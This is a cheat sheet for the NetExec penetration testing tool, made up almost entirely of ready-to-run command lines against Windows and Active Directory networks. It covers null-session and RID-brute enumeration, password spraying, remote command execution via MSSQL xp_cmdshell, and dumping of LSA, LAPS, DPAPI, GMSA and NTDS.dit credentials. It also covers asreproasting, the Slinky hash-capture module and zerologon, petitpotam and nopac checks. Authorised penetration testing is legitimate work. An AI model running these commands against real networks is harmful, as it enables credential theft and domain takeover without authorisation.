<img src="https://www.netexec.wiki/~gitbook/image?url=https%3A%2F%2F361548579-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fb0qbsNvsXjRTsQcNipGM%252Fuploads%252FNEZU0Fm9755tKpoesEZ0%252FNetExec-Logo-Color.png%3Falt%3Dmedia%26token%3D4cb6bf72-4506-45b2-9388-166b13d7715a&width=1248&dpr=1&quality=100&sign=83eca0daa5f4b5890816537cfd6ba8bb79f2230db95a009b0679e5717a7c1a8b" />

<Callout> NetExec is a powerful tool for network enumeration, spraying, and various other penetration testing tasks. This guide provides an overview of its functionalities and commands to help you get started </Callout>
<Callout> https://github.com/Pennyw0rth/NetExec </Callout>
## Table of Contents

- [Enumeration](#enumeration)
- [Spraying](#spraying)
- [SMB](#smb)
- [LDAP](#ldap)
- [MSSQL](#mssql)
- [Secrets Dump](#secrets-dump)
- [Asreproast](#asreproast)
- [Bloodhound](#bloodhound)
- [Useful Modules](#useful-modules)

### NXC
```java
nxc
usage: nxc [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6]
           [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [--version]
           {winrm,ftp,rdp,wmi,smb,ldap,vnc,mssql,ssh} ...
options:
  -h, --help            show this help message and exit
  --version             Display nxc version

Generic:
  Generic options for nxc across protocols

  -t THREADS, --threads THREADS
                        set how many concurrent threads to use
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  Options to set verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds

Available Protocols:
  {winrm,ftp,rdp,wmi,smb,ldap,vnc,mssql,ssh}
    winrm               own stuff using WINRM
    ftp                 own stuff using FTP
    rdp                 own stuff using RDP
    wmi                 own stuff using WMI
    smb                 own stuff using SMB
    ldap                own stuff using LDAP
    vnc                 own stuff using VNC
    mssql               own stuff using MSSQL
    ssh                 own stuff using SSH
```

## Enumeration

### Initial Enumeration

```java
nxc smb target
```

### Null Authentication

```java
nxc smb target -u '' -p ''
```

### Guest Authentication

```bash
nxc smb target -u 'guest' -p ''
```

### List Shares

```bash
nxc smb target -u '' -p '' --shares
```

```bash
nxc smb target -u username -p password --shares
```

### List Usernames

```bash
nxc smb target -u '' -p '' --users
```

```bash
nxc smb target -u '' -p '' --rid-brute
```

```bash
nxc smb target -u username -p password --users
```

### Local Authentication

```bash
nxc smb target -u username -p password --local-auth
```

### Using Kerberos

```bash
nxc smb target -u username -p password -k
```

### Check for Hosts with SMB Signing Disabled

```bash
nxc smb target(s) --gen-relay-list relay.txt
```

## Spraying

### Password Spray

```bash
nxc smb target -u users.txt -p password --continue-on-success
```

```bash
nxc smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
```

```bash
nxc ssh target(s) -u username -p password --continue-on-success
```

## SMB

### All In One

```bash
nxc smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```

### Spider_plus Module

```bash
nxc smb target -u username -p password -M spider_plus
```

```bash
nxc smb target -u username -p password -M spider_plus -o READ_ONLY=false
```

### Dump a Specific File

```bash
nxc smb target -u username -p password -k --get-file target_file output_file --share sharename
```

## LDAP

### Enumerate Users Using LDAP

```bash
nxc ldap target -u '' -p '' --users
```

### All In One

```bash
nxc ldap target -u username -p password --trusted-for-delegation --password-not-required --admin-count --users --groups
```

## MSSQL

### Authentication

```bash
nxc mssql target -u username -p password
```

### Execute Commands Using `xp_cmdshell`

> Use `-X` for PowerShell and `-x` for cmd

```bash
nxc mssql target -u username -p password -x command_to_execute
```

### Get a File

```bash
nxc mssql target -u username -p password --get-file output_file target_file
```

## Secrets Dump

### Dump LSA Secrets

```bash
nxc smb target -u username -p password --local-auth --lsa
```

### GMSA

```bash
nxc ldap target -u username -p password --gmsa-convert-id id
```

```bash
nxc ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
```

### Group Policy Preferences

```bash
nxc smb target -u username -p password -M gpp_password
```

### Dump LAPS Password

```bash
nxc smb target -u username -p password --laps
```

### Dump DPAPI Credentials

```bash
nxc smb target -u username -p password --laps --dpapi
```

### Dump NTDS.dit

```bash
nxc smb target -u username -p password --ntds
```

## Asreproast

```bash
nxc ldap target -u username -p password --asreproast asrep.txt
```

## Bloodhound

```bash
nxc ldap target -u username -p password --bloodhound -ns ip --collection All
```

## Useful Modules

### Webdav

Checks whether the WebClient service is running on the target

```bash
nxc smb ip -u username -p password -M webdav
```

### Veeam

Extracts credentials from the local Veeam SQL Database

```bash
nxc smb target -u username -p password -M veeam
```

### Slinky

Creates Windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions

```bash
nxc smb ip -u username -p password -M slinky
```

### Ntdsutil

Dump NTDS with ntdsutil

```bash
nxc smb ip -u username -p password -M ntdsutil
```

### Ldap-checker

Checks whether LDAP signing and binding are required and/or enforced

```bash
nxc ldap target -u username -p password -M ldap-checker
```

### Check for Vulnerabilities

Check if the DC is vulnerable to zerologon, petitpotam, or nopac

```bash
nxc smb target -u username -p password -M zerologon
```

```bash
nxc smb target -u username -p password -M petitpotam
```

```bash
nxc smb target -u username -p password -M nopac
```

### Check the MachineAccountQuota

```bash
nxc ldap target -u username -p password -M maq
```

### ADCS Enumeration

```bash
nxc ldap target -u username -p password -M adcs
```

---

For more detailed installation instructions, visit the [NetExec](https://www.netexec.wiki/).
